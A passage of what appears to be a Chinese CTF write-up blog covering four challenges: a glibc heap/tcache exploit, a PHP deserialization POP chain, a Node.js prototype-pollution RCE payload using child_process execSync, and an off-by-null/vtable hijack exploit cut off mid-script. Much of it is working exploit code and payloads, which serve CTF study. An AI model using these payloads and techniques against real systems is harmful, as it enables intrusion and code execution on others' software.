bin。\n\n接着我们创建一个0x50大小的chunk(至于为什么我放到代码当中解释)。\n\n接着开始猜stdout的地址。到这一步，成功的概率只有1/256了所以我就不做过程截图了(因为我自己打本地的时候等了五六分钟，他给我来一句程序运行太多，就没了)所以下面直接给exp了。\nexpfrom pwn import *from LibcSearcher import *elf = ELF(&quot;./look_face_no_patch&quot;)r = process(&#x27;./look_face_no_patch&#x27;)context.log_level = &#x27;debug&#x27;def create(contents):    r.recvuntil(b&#x27;&gt;&gt;&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;cont...&#x27;)    r.sendline(contents)def delete():    r.recvuntil(b&#x27;&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)def boom():    create(b&#x27;\\x00&#x27;*0x30)    delete()    delete()    heap = 0x8010    create((p16(heap)+b&#x27;\\n&#x27;).ljust(0x30, b&#x27;\\x00&#x27;))    create(b&quot;\\n&quot;.ljust(0x30, b&#x27;\\x00&#x27;))    create(b&#x27;\\xff&#x27;*0x30)    delete()    create(b&#x27;\\x00&#x27;*0x40)# 放开前面的counts区域，修改后面的tcache_entry指针，并且是tcache_counts为0，为后续做铺垫    stdout = 0x8760    create((p16(stdout)+b&#x27;\\n&#x27;).ljust(0x10, b&#x27;\\x00&#x27;))# 开始爆破stdout的地址(也只需要爆破一位)，这一块chunk是切割的unsorted bin当中的内容，也就是tcache_struct，下去思考一下就能想到我们爆破的是tcache大小为0x40的指针    create((p64(0xfbad1800)+p64(0)*3+p64(0x60)+b&#x27;\\n&#x27;).ljust(0x30, b&#x27;\\x00&#x27;))# 这一步开始修改结构体内部的值    r.recvuntil(b&#x27;\\n&#x27;)    if u64(r.recv(8)) != 0xfbad1800:        return 0    r.recv(0x20)    stdout = u64(r.recv(6).ljust(0x8, b&#x27;\\x00&#x27;))-131    print(hex(stdout))    # libc = LibcSearcher(&#x27;_IO_2_1_stdout_&#x27;, stdout)    libc = ELF(&#x27;./libc-2.27.so&#x27;)    # success(libc.address)    libc_base = stdout-libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]    pop_rdi = 0x000000000002155f+libc_base    pop_rsi = 0x0000000000023e8a+libc_base    pop_rdx = 0x0000000000001b96+libc_base    push_rsp = 0x0000000000024ef4+libc_base    open_addr = libc_base+libc.symbols[&#x27;open&#x27;]    read_addr = libc_base+libc.symbols[&#x27;read&#x27;]    write_addr = libc_base+libc.symbols[&#x27;write&#x27;]    malloc_hook = libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]    create((p64(malloc_hook)+b&#x27;\\n&#x27;).ljust(0x10, b&#x27;\\x00&#x27;))# 这一步我们又是从unsorted bin当中切出来位置，但因为上面用了0x20所以我们修改的tcache_entry是大小为0x80的chunk。后面就是正常的构造ROP了    create((p64(push_rsp)+b&#x27;/flag&#x27;+b&#x27;\\n&#x27;).ljust(0x70, b&#x27;\\x00&#x27;))    payload = p64(pop_rdi)+p64(malloc_hook+0x8)+p64(open_addr)+p64(pop_rdi) + \\        p64(3)+p64(pop_rdx)+p64(0x50)+p64(pop_rsi) + \\        p64(malloc_hook+10)+p64(puts)+b&#x27;\\n&#x27;    create(payload.ljust(0x70, b&#x27;\\x00&#x27;))if __name__ == &#x27;__main__&#x27;:    while 1:        try:            res = boom()            if(res == 0):                r = process(&#x27;./look_face_no_patch&#x27;)                continue            break        except:            r = process(&#x27;./look_face_no_patch&#x27;)            continue    gdb.attach(r)    r.interactive()\n\n上面代码解释可能难以理解，所以我画了一张图。\n我们将存放tcache_struct的chunk释放进unsorted bin当中的后续情况如下图：\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"GYCTF2020_Easyphp","url":"/2021/09/25/GYCTF2020-Easyphp/","content":"获取信息扫目录我的dirsearch不出所料的没扫到www.zip看了wp才知道是有源文件泄漏\n代码审计index.php\n&lt;?phprequire_once &quot;lib.php&quot;;if(isset($_GET[&#x27;action&#x27;]))&#123;\trequire_once(__DIR__.&quot;/&quot;.$_GET[&#x27;action&#x27;].&quot;.php&quot;);&#125;else&#123;\tif($_SESSION[&#x27;login&#x27;]==1)&#123;\t\techo &quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;;\t&#125;\telse&#123;\t\techo &quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;;\t&#125;&#125;?&gt;\n\nlogin.php\n&lt;?phprequire_once(&#x27;lib.php&#x27;);?&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;login&lt;/title&gt;&lt;center&gt;\t&lt;form action=&quot;login.php&quot; method=&quot;post&quot; style=&quot;margin-top: 300&quot;&gt;\t\t&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;\t\t&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;        \t\t&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;UserName&quot; required&gt;\t\t&lt;br&gt;\t\t&lt;input type=&quot;password&quot; style=&quot;margin-top: 20&quot; name=&quot;password&quot; placeholder=&quot;password&quot; required&gt;\t\t&lt;br&gt;\t\t&lt;button style=&quot;margin-top:20;&quot; type=&quot;submit&quot;&gt;登录&lt;/button&gt;\t\t&lt;br&gt;\t\t&lt;img src=&#x27;img/1.jpg&#x27;&gt;大家记得做好防护&lt;/img&gt;\t\t&lt;br&gt;\t\t&lt;br&gt;&lt;?php $user=new user();if(isset($_POST[&#x27;username&#x27;]))&#123;\tif(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123;\t\tdie(&quot;&lt;br&gt;Damn you, hacker!&quot;);\t&#125;\tif(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;password&#x27;]))&#123;\t\tdie(&quot;Damn you, hacker!&quot;);\t&#125;\t$user-&gt;login();&#125;?&gt;\t&lt;/form&gt;&lt;/center&gt;\n\nlib.php\n&lt;?phperror_reporting(0);session_start();function safe($parm)&#123;    $array = array(&#x27;union&#x27;, &#x27;regexp&#x27;, &#x27;load&#x27;, &#x27;into&#x27;, &#x27;flag&#x27;, &#x27;file&#x27;, &#x27;insert&#x27;, &quot;&#x27;&quot;, &#x27;\\\\&#x27;, &quot;*&quot;, &quot;alter&quot;);    return str_replace($array, &#x27;hacker&#x27;, $parm);&#125;class User&#123;    public $id;    public $age = null;    public $nickname = null;    public function login()    &#123;        if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;])) &#123;            $mysqli = new dbCtrl();            $this-&gt;id = $mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);            if ($this-&gt;id) &#123;                $_SESSION[&#x27;id&#x27;] = $this-&gt;id;                $_SESSION[&#x27;login&#x27;] = 1;           // target                echo &quot;你的ID是&quot; . $_SESSION[&#x27;id&#x27;];                echo &quot;你好！&quot; . $_SESSION[&#x27;token&#x27;];                echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;                return $this-&gt;id;            &#125;        &#125;    &#125;    public function update()    &#123;        $Info = unserialize($this-&gt;getNewinfo());        $age = $Info-&gt;age;        $nickname = $Info-&gt;nickname;        $updateAction = new UpdateHelper($_SESSION[&#x27;id&#x27;], $Info, &quot;update user SET age=$age,nickname=$nickname where id=&quot; . $_SESSION[&#x27;id&#x27;]);        //这个功能还没有写完 先占坑    &#125;    public function getNewInfo()    &#123;        $age = $_POST[&#x27;age&#x27;];        $nickname = $_POST[&#x27;nickname&#x27;];        return safe(serialize(new Info($age, $nickname)));    &#125;    public function __destruct()    &#123;        return file_get_contents($this-&gt;nickname); //危    &#125;    public function __toString()    &#123;        // nickname = new Info();        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct($age, $nickname)    &#123;        $this-&gt;age = $age;        $this-&gt;nickname = $nickname;    &#125;    public function __call($name, $argument)    &#123;        // CtrlCase = new dbCtrl();        echo $this-&gt;CtrlCase-&gt;login($argument[0]);        // argument[0] = &#x27;select id,md5(1) from user where username=?&#x27;    &#125;&#125;class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo, $sql)    &#123;        $newInfo = unserialize($newInfo);        $upDate = new dbCtrl();    &#125;    public function __destruct()    &#123;        // sql = new User();        echo $this-&gt;sql;    &#125;&#125;class dbCtrl&#123;    public $hostname = &quot;127.0.0.1&quot;;    public $dbuser = &quot;root&quot;;    public $dbpass = &quot;root&quot;;    public $database = &quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name = $_POST[&#x27;username&#x27;];        $this-&gt;password = $_POST[&#x27;password&#x27;];        $this-&gt;token = $_SESSION[&#x27;token&#x27;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli = new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result = $this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token == &#x27;admin&#x27;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo (&#x27;用户不存在!&#x27;);            return false;        &#125;        if (md5($this-&gt;password) !== $passwordResult) &#123;            echo (&#x27;密码错误！&#x27;);            return false;        &#125;        $_SESSION[&#x27;token&#x27;] = $this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        //还没来得及写    &#125;&#125;\n\nupdate.php\n&lt;?phprequire_once(&#x27;lib.php&#x27;);echo &#x27;&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;update&lt;/title&gt;&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;&lt;/html&gt;&#x27;;if ($_SESSION[&#x27;login&#x27;]!=1)&#123;\techo &quot;你还没有登陆呢！&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123;\trequire_once(&quot;flag.php&quot;);\techo $flag;&#125;?&gt;\n\n经过审计可以很轻易的发现漏洞点在update.php\n\n即便是上面if语句成立也会执行下面的内容\n\n然后存在反序列化漏洞，开始看见下面存在file_get_contents觉得可以直接获取flag但是是我想多了，上面有个safe函数过滤了flag关键字。\n\n只要我的session文件login为1就可以拿到flag，再看lib.php那里修改了session\n\nUser的login函数会修改$_SESSION[‘login’]=1,但是一定要this-&gt;id存在，所以必定要执行这个sql语句\n\n里面只需要this-&gt;token为admin就可以返回id所以只需要最下面的$_SESSION[‘token’]=$this-&gt;name执行了，后续直接随便登录就行。\n构造pop链由上面可知我们最后需要执行的是dbCtrl-&gt;login()\n往上看有一个很显眼的\n\n看得到这里有一个很刺眼的login，所以在倒数第二步应该是他了(这些赋值的注释是我在做题过程中自己写的一些笔记)\n然后就是找到调用__call的地方\n在User类里面的__toString函数里面存在可以达到目的的调用方式\n\n最后在哪调用__toString也很简单了\n\n这里有一个很明显的echo，所以整条链子都清楚了。\nUpdateHelper-&gt;__destruct==&gt;User-&gt;__toString==&gt;Info-&gt;__call==&gt;dbCtrl-&gt;login\n解题给出exp\n&lt;?phpclass User&#123;    public $age;    public $nickname;    public function __construct()    &#123;        $this-&gt;nickname = new Info();        $this-&gt;age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;    &#125;&#125;class Info&#123;    public $CtrlCase;    public function __construct()    &#123;        $this-&gt;CtrlCase = new dbCtrl();    &#125;&#125;class UpdateHelper&#123;    public $sql;    public function __construct()    &#123;        $this-&gt;sql = new User();    &#125;&#125;class dbCtrl&#123;    public $name;    public $password;    public function __construct()    &#123;        $this-&gt;name = &#x27;admin&#x27;;        $this-&gt;password = &#x27;1&#x27;;    &#125;&#125;echo serialize(new UpdateHelper());// 这里还需要通过上面的replace来进行字符串逃逸。\n\n最终的payload:\nage=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;\n\n","categories":["web-buuctf"],"tags":["pop链"]},{"title":"GYCTF2020_Ez_Express","url":"/2021/10/04/GYCTF2020-Ez-Express/","content":"信息收集打开题目就一个登录注册页面，并没有找到什么。直接扫目录\n扫出info。访问里面显示有一个/www.zip源码泄漏\nindex.js\nvar express = require(&#x27;express&#x27;);var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123;  for (var attr in b) &#123;    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;      merge(a[attr], b[attr]);    &#125; else &#123;      a[attr] = b[attr];    &#125;  &#125;  return a&#125;const clone = (a) =&gt; &#123;  return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123;  if (keyword.match(/(admin)/is)) &#123;    return keyword  &#125;  return undefined&#125;router.get(&#x27;/&#x27;, function (req, res) &#123;  if (!req.session.user) &#123;    res.redirect(&#x27;/login&#x27;);  &#125;  res.outputFunctionName = undefined;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: req.session.user.user &#125;);&#125;);router.get(&#x27;/login&#x27;, function (req, res) &#123;  res.render(&#x27;login&#x27;);&#125;);router.post(&#x27;/login&#x27;, function (req, res) &#123;  if (req.body.Submit == &quot;register&quot;) &#123;    if (safeKeyword(req.body.userid)) &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;    req.session.user = &#123;      &#x27;user&#x27;: req.body.userid.toUpperCase(),      &#x27;passwd&#x27;: req.body.pwd,      &#x27;isLogin&#x27;: false    &#125;    res.redirect(&#x27;/&#x27;);  &#125;  else if (req.body.Submit == &quot;login&quot;) &#123;    if (!req.session.user) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;    if (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;      req.session.user.isLogin = true;    &#125;    else &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;  &#125;  res.redirect(&#x27;/&#x27;);;&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: res.outputFunctionName &#125;);&#125;)module.exports = router;\n\n知识点原型链污染js的考点主要还是原型链污染，这里的merge函数也就是危险函数。\nconst isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;// 上面就是检验参数obj是否是个对象const merge = (a, b) =&gt; &#123;  for (var attr in b) &#123;    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;      merge(a[attr], b[attr]);// 要是b和a的attr属性是一个对象的话就会进行递归    &#125; else &#123;      a[attr] = b[attr];// 将对象b的属性赋值给a    &#125;  &#125;  return a&#125;// 所以根据上面，可以看出来原型对象__proto__会进入递归赋值，然而js的对象寻找属性的规则就是，要是对象本身找不到这个属性就会跟着__proto__链找，直到__proto__为NULL，所以当我们有可控参数的时候就可以让，Object()的__proto__赋上我们想要的键值。const clone = (a) =&gt; &#123;  return merge(&#123;&#125;, a);&#125;// 这就是一个闭包\n\n编码绕过\n可以看到提示有admin用户\nrouter.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);\n\n也许要admin用户才能提交action\nfunction safeKeyword(keyword) &#123;  if (keyword.match(/(admin)/is)) &#123;    return keyword  &#125;  return undefined&#125;router.post(&#x27;/login&#x27;, function (req, res) &#123;  if (req.body.Submit == &quot;register&quot;) &#123;    if (safeKeyword(req.body.userid)) &#123;// 但是这里可以看到要是直接提交admin会被过滤这里用特殊字符绕过      res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;    req.session.user = &#123;      &#x27;user&#x27;: req.body.userid.toUpperCase(),      &#x27;passwd&#x27;: req.body.pwd,      &#x27;isLogin&#x27;: false    &#125;    res.redirect(&#x27;/&#x27;);  &#125;  else if (req.body.Submit == &quot;login&quot;) &#123;    if (!req.session.user) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;    if (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;      req.session.user.isLogin = true;    &#125;    else &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;  &#125;  res.redirect(&#x27;/&#x27;);;&#125;);\n\n\n特殊字符绕过\ntoUpperCase()\n这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。\ntoLowerCase()\n这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.\n\n解题首先使用admın,绕过注册绕过safeKeyword\nrouter.get(&#x27;/&#x27;, function (req, res) &#123;  if (!req.session.user) &#123;    res.redirect(&#x27;/login&#x27;);  &#125;  res.outputFunctionName = undefined;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: req.session.user.user &#125;);&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);// 这里存在原型链污染  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: res.outputFunctionName &#125;);// 这里调用了outputFunctionName属性，但是在&quot;/&quot;路由里面让这个属性等于了undefined所以只需要污染这个属性就可以实现SSTI&#125;)\n\npayload:&#123;&quot;lua&quot;:&quot;python&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;// 注意要将POST的enctype换成application/json才能当作对象解析\n","categories":["web-buuctf"],"tags":["原型链污染"]},{"title":"GKCTF_2020_domo","url":"/2022/02/10/GKCTF-2020-domo/","content":"复现一场比赛被第一道题卡了贼久，我太菜了，越学pwn越在想要是比赛第一题就是这个我连一道题都做不出来怎么办哦。\n吐槽: nss给的libc怎么也不对啊？\n\n简要分析__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v4; // [rsp+0h] [rbp-20h] BYREF  int v5; // [rsp+4h] [rbp-1Ch] BYREF  int v6; // [rsp+8h] [rbp-18h] BYREF  int v7; // [rsp+Ch] [rbp-14h] BYREF  __int64 v8; // [rsp+10h] [rbp-10h]  unsigned __int64 v9; // [rsp+18h] [rbp-8h]  v9 = __readfsqword(0x28u);  v4 = 1;  v5 = 1;  v6 = 1;  sub_BA0(a1, a2, a3);  sub_C9D();  puts(&quot;Welcome to GKCTF&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          menu();                               //   puts(&quot;1: Add a user&quot;);                                                //   puts(&quot;2: Delete a user&quot;);                                                //   puts(&quot;3: Show a user&quot;);                                                //   puts(&quot;4: Edit a user&quot;);                                                //   return puts(&quot;5: Exit&quot;);          printf(&quot;&gt; &quot;);          _isoc99_scanf(&quot;%d&quot;, &amp;v7);          if ( v7 != 1 )            break;          add(&quot;%d&quot;, &amp;v7);        &#125;        if ( v7 != 2 )          break;        delete(&quot;%d&quot;, &amp;v7);      &#125;      if ( v7 != 3 )        break;      show(&quot;%d&quot;, &amp;v7);    &#125;    if ( v7 != 4 )      break;    edit(&amp;v4, &amp;v5, &amp;v6);  &#125;  v8 = seccomp_init(2147418112LL);  seccomp_rule_add(v8, 0LL, 59LL, 0LL);  seccomp_rule_add(v8, 0LL, 4294957238LL, 0LL);  seccomp_rule_add(v8, 0LL, 10LL, 0LL);  seccomp_load(v8);  puts(&quot;oh,Bye&quot;);  return 0LL;&#125;\n\n在main内的最后开启了沙盒，可以看出来禁用了execve的调用。\nunsigned __int64 __fastcall sub_E6C(const char *a1)&#123;  size_t nbytes; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  if ( check(a1) == 1 &amp;&amp; chunk_num[0] &lt;= 8 )  &#123;    HIDWORD(nbytes) = 0;    while ( SHIDWORD(nbytes) &lt;= 8 )    &#123;      if ( !*(&amp;chunk_arr + SHIDWORD(nbytes)) )      &#123;        puts(&quot;size:&quot;);        _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);        if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; nbytes &lt;= 288 )        &#123;          *(&amp;chunk_arr + SHIDWORD(nbytes)) = malloc(nbytes);          puts(&quot;content:&quot;);          read(0, *(&amp;chunk_arr + SHIDWORD(nbytes)), nbytes);          *(*(&amp;chunk_arr + SHIDWORD(nbytes)) + nbytes) = 0;// off by null          ++chunk_num[0];        &#125;        else        &#123;          puts(&quot;sobig&quot;);        &#125;        return __readfsqword(0x28u) ^ v3;      &#125;      ++HIDWORD(nbytes);    &#125;  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n在add函数存在明显的off by null漏洞。\n__int64 sub_C16()&#123;  void *(*volatile v0)(size_t, const void *); // rax  bool v1; // dl  void (*volatile v2)(void *, const void *); // rax  v0 = _malloc_hook;  v1 = v0 != 0LL;  v2 = _free_hook;  if ( !v1 &amp;&amp; v2 == 0LL )    return 1LL;  puts(&quot;oh no&quot;);  return 0LL;&#125;\n\n在add函数和delete函数的开头部分都存在这个函数检验_malloc_hook和_free_hook是否被修改。所以常规的修改hook为one_gadget是不现实的了。\nunsigned __int64 __fastcall sub_115E(_DWORD *a1, _DWORD *a2, _DWORD *a3)&#123;  void *buf; // [rsp+20h] [rbp-10h] BYREF  unsigned __int64 v6; // [rsp+28h] [rbp-8h]  v6 = __readfsqword(0x28u);  buf = 0LL;  if ( check() == 1 )  &#123;    if ( *a1 &amp;&amp; *a2 &amp;&amp; *a3 )    &#123;      puts(&quot;addr:&quot;);      _isoc99_scanf(&quot;%ld&quot;, &amp;buf);      puts(&quot;num:&quot;);      read(0, buf, 1uLL);      *a1 = 0;      *a2 = 0;      *a3 = 0;      puts(&quot;starssgo need ten girl friend &quot;);    &#125;    else    &#123;      puts(&quot;You no flag&quot;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\n这里的edit函数和常规完全不一样，这里是存在一个任意地址写一字节并且只允许执行一次。\n利用过程leak libc addr当unsortedbin只有一个chunk的时候它的fd指针和bk指针都是指向main_arena的。\n\n然后申请一个同样大小的chunk并且输入b’a’*7+b’\\n’\n\n即可获得main_arena的地址，然后计算出libc_base的地址。\nleak heap addr利用思路跟上面类似，不过是用fastbin。\n\n此时他的fd指针指向的是他下一个chunk。申请一个size相同并且输入空字符即可求出heap的地址。\nchunk overlap接着就是利用堆的堆放方式利用off by null触发unlink为fastbin attack做准备。\ncreate(0x40, b&#x27;&#x27;)create(0x68, b&#x27;&#x27;)create(0xf0, b&#x27;&#x27;)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))delete(2)\n\n\n我们使用以上三个chunk来进行，并且在chunk0的里面我们伪造一个size为0xb0的fake chunk。\n\n可以看到经过上面我们已经修改了size为0x100的inuse位的值0，那么此时我们free掉它。\n\n可以看到此时我们伪造的fake chunk的size已经变为了0x1b1\n\n并且可以看到unlink后的fake chunk已经进入了unsorted bin了。\nvtable在进行fastbin attack之前我们先先看看vtable是个什么东西\n\n可以看到下面的vtable变量，存放的值是_IO_file_jumps的指针\n\n可以看到_IO_file_jumps结构内存放很多函数的指针，一系列标准IO函数都会调用这些指针，但是_IO_file_jumps结构本身是不可写的，但是我们可以修改vtable指向我们伪造的_IO_file_jumps结构。\nfastbin attackcreate(0xc0, b&#x27;&#x27;)delete(1)delete(2)_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]info(hex(_IO_2_1_stdin_))fake_chunk = _IO_2_1_stdin_+160-3create(0xc0, b&#x27;a&#x27;*0x38+p64(0x71)+p64(fake_chunk))  create(0xa8, p64(0)*2+p64(one_gadget)*19)\n\n首先申请一个size为0xc0的chunk，而这个chunk会在unsorted bin当中的fake chunk中割出一部分拿给我们。所以我们可以通过这样一个chunk来修改我们放到fastbin当中的chunk。\n先看_IO_2_1_stdin_附近适合用来构造fake chunk的地方。\n\n可以看到这个位置是很适合拿来做chunk的size的也就是_IO_2_1_stdin_+160-3\n\n可以看到fastbin当中的chunk被我们改变了到了制定位置，然后伪造vtable也在了，最后修改getshell即可\n综上得出expfrom pwn import *r = process(&#x27;./domo&#x27;)elf = ELF(&#x27;./domo&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)def create(size, content):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.sendline(content)def delete(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def show(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def edit(address, num):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;addr:&#x27;)    r.senline(bytes(str(address), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;num:&#x27;)    r.sendline(bytes(str(num), encoding=&#x27;utf-8&#x27;))create(0x40, b&#x27;&#x27;)  # 0create(0x68, b&#x27;&#x27;)  # 1create(0xf0, b&#x27;&#x27;)  # 2create(0x10, b&#x27;&#x27;)  # 3delete(2)create(0xf0, b&#x27;a&#x27;*7)  # 2show(2)print(r.recvuntil(b&#x27;\\n&#x27;))print(r.recvuntil(b&#x27;a\\n&#x27;))main_arena_88 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = 